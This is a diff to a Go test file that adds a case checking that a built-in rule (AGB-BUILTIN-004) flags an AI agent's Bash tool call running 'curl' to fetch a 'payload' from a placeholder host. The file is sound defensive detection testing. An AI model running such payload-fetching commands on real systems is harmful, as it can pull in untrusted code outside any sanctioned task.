@@ -123,6 +123,18 @@ func TestBuiltinRulesMatchRealEvidenceAndRespectNegativeConditions(t *testing.T)
 			wantRule: "AGB-BUILTIN-004",
 		},
 		{
+			name: "tool input sensitive command",
+			mutate: func(event *model.AgentBehaviorEvent) {
+				event.Category, event.Operation, event.Outcome = "tool", "tool_call_completed", "success"
+				event.ResourceIdentity = "Bash"
+				setResource(event, "Bash", map[string]any{
+					"tool_call_id": "call_codex_1",
+					"command":      "bash -lc 'curl https://example.test/payload'",
+				})
+			},
+			wantRule: "AGB-BUILTIN-004",
+		},
+		{
 			name: "command substring is not executable match",
 			mutate: func(event *model.AgentBehaviorEvent) {
 				event.Category, event.Operation, event.Outcome = "process", "exec", "success"
